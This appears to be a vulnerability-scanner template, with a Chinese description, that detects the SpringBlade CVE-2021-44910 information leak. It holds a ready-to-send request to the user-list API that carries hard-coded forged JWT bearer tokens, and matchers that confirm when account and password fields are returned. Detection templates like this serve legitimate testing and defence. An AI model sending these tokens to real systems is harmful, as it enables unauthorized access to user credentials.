id: springblade-info-leak

info:
  name: SpringBlade - 漏洞（CVE-2021-44910）
  author: lbb
  severity: high
  description: |
    该模板用于检测 SpringBlade - 漏洞。该类问题通常源于调试页面、配置文件、接口响应或目录资源被非预期暴露。模板会向 `/api/blade-user/user-list` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可获取系统版本、路径、账号、密钥、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于后续漏洞匹配、凭据攻击、权限提升或横向移动。
  remediation: |
    - 关闭不必要的调试、示例、备份和信息展示接口，避免向未授权用户返回敏感内容。
    - 对敏感文件和接口增加访问控制，并从 Web 根目录移除备份、日志和配置文件。
    - 排查已泄露的凭据、令牌和配置，必要时执行轮换并检查访问日志。
  reference:
    - https://github.com/chillzhuang/blade-tool
  metadata:
    max-request: 3
  tags: springblade,blade,info-leak,vuln

http:
  - raw:
      - |
        GET /api/blade-user/user-list HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer {{bearer}}

    payloads:
      bearer:
        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9..gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
        - 'eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9..gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk'
        - 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"account":'
          - '"password":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
